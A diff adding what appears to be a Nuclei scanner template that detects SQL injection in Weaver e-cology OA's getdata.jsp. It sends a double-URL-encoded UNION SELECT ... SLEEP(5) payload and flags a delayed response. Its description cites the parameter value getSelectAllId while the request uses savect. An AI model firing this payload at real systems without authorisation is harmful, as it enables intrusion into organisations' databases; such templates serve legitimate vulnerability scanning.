@@ -1,0 +1,24 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=5  && duration_1<=8
+          type: dsl
+      raw:
+        - |
+          GET /js/hrm/getdata.jsp?cmd=savect&arg0=%2531%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2533%252c%2534%252c%2535%252c%2553%254c%2545%2545%2550%2528%2535%2529%2520%2523&arg1=1&arg2=2&arg3=3 HTTP/1.1
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+          Accept-Encoding: gzip, deflate
+          Accept: */*
+          Connection: close
+id: e-cology-js-hrm-getdata-SQL
+info:
+    author: SleepingBag945
+    description: 泛微e-cology OA系统的在 getdata.jsp 中，传入参数 cmd 值等于 getSelectAllId 时， 将从请求中获取 sql 参数值执行，导致 sql 注入
+    name: e-cology-js-hrm-getdata-SQL
+    reference:
+        - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20getdata.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+    severity: critical
+    tags:
+        - ecology
+        - weaver
